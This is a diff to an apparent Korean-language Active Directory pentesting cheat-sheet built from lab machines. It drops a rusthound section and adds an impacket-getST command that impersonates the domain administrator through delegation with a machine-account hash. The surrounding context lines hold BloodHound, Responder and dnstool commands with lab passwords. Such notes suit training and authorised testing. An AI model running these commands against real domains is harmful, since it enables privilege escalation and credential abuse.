@@ -576,11 +576,6 @@ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
 ```bash
 bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns 192.168.208.40
 ```
-
-## rusthound
-```bash
-rusthound-ce -d <domain> -u <user> -p <password>
-```
   
 </details>
 
@@ -853,4 +848,15 @@ dnstool -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 --ac
 sudo responder -I tun0 -v
 ```
   
+</details>
+
+---
+<details>
+  <summary><strong>getST</strong></summary>
+
+- `Service Principal Names`에 `HOST/dc.intelligence.htb`가 존재하면 `WWW/dc.intelligence.htb` 혹은 `HTTP/dc.intelligence.htb`도 사용 가능하다.
+```bash
+impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate administrator -altservice 'cifs' -hashes :0d5463c6e805b0908b61e90cf9219dc3 intelligence.htb/'svc_int$'
+```
+
 </details>
